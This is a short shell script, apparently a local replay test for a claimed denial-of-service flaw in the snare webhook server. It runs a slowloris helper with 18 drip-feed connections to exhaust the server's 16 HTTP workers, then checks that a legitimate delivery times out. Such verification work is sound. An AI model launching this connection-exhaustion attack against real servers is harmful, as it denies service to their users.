#!/bin/sh
# S2 (#112) vuln replay: 18 drip-feed connections (> MAX_SIMULTANEOUS_CONNECTIONS=16,
# src/httpserver.rs:24) pin every HTTP worker via the per-read-timeout gap, then
# a legitimate unsigned webhook delivery times out.
# Expected if the claim is real: CLAIM_EFFECT=worker_exhaustion_denial.
pkill -x snare
/tmp/opencode/snare-target/release/snare -d -c /tmp/opencode/s2-snare.conf \
    >/tmp/opencode/s2-vuln-server.log 2>&1 &
sleep 0.7
python3 "$(dirname "$0")/s2_slowloris.py" 18011 18 40 &
SL=$!
sleep 3
python3 "$(dirname "$0")/s2_legit.py" 18011 6
RC=$?
kill "$SL" 2>/dev/null
wait "$SL" 2>/dev/null
pkill -x snare
exit 0
